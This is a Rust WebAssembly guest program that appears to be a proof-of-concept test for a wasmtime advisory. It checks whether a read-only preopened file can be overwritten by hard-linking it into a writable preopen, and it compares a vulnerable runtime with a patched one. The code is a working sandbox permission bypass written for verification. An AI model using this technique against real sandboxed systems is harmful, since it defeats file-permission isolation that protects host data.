// EXP-C guest — GHSA-4ch3-9j33-3pmj: can a FilePerms::READ file be rewritten
// by hard-linking it into a FilePerms::all() preopen?
//
// Build: rustc -O --target wasm32-wasip1 guest_cve.rs -o guest_cve.wasm
// Run:   through harness/host (the wasmtime CLI cannot express this — it always
//        grants all file permissions on every --dir).
//
// Four steps, in order. Step 4 is the only one that settles anything: steps 1
// and 3 print the SAME line on the vulnerable and the patched runtime.
use std::fs::{self, OpenOptions};
use std::io::Write;

fn main() {
    // 1 — the front door. Should be refused: ro has FilePerms::READ.
    match OpenOptions::new().write(true).open("ro/secret.txt") {
        Ok(_) => println!("[1 직접쓰기]   ro/secret.txt write-open: OPENED (!)"),
        Err(e) => println!("[1 직접쓰기]   ro/secret.txt write-open: BLOCKED: {e}"),
    }

    // 2 — the side door. Give the protected inode a second name, this one
    //     inside the writable preopen. THIS is the vulnerability.
    match fs::hard_link("ro/secret.txt", "rw/leaked") {
        Ok(()) => println!("[2 하드링크]   ro/secret.txt -> rw/leaked: LINKED"),
        Err(e) => println!("[2 하드링크]   ro/secret.txt -> rw/leaked: BLOCKED: {e}"),
    }

    // 3 — write through the new name. Succeeds on BOTH versions, and means
    //     opposite things: protected inode overwritten (46.0.0) vs a brand-new
    //     independent file in rw/ (46.0.1). Do not read this line as a verdict.
    match OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .open("rw/leaked")
    {
        Ok(mut f) => match f.write_all(b"MODIFIED-VIA-LINK") {
            Ok(()) => println!("[3 우회쓰기]   rw/leaked write: WROTE"),
            Err(e) => println!("[3 우회쓰기]   rw/leaked write: FAILED: {e}"),
        },
        Err(e) => println!("[3 우회쓰기]   rw/leaked open: FAILED: {e}"),
    }

    // 4 — the verdict. "SECRET-readonly-original" = the sandbox held.
    //     "MODIFIED-VIA-LINK" = a read-only file was rewritten.
    match fs::read_to_string("ro/secret.txt") {
        Ok(s) => println!("[4 원본확인]   ro/secret.txt = {:?}", s.trim()),
        Err(e) => println!("[4 원본확인]   ro/secret.txt read failed: {e}"),
    }
}
